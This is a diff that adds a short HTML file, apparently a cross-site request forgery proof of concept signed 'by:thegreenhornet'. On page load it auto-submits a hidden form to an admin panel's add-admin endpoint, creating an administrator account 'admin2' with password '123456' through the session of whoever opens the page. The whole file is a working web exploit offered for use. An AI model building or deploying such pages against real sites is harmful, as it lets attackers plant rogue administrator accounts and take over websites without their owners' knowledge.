@@ -1,0 +1,10 @@
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<p>by:thegreenhornet</p>
+<form method="POST" name="form0" action="
+http://www.example.com/top/admincp/main.php?op=add-admin">
+<input type="hidden" name="u_name" value="admin2"/>
+<input type="hidden" name="u_m_pass" value="123456"/>
+<input type="hidden" name="u_email" value="WW22@rwoot.com"/>
+</form>
+</body>
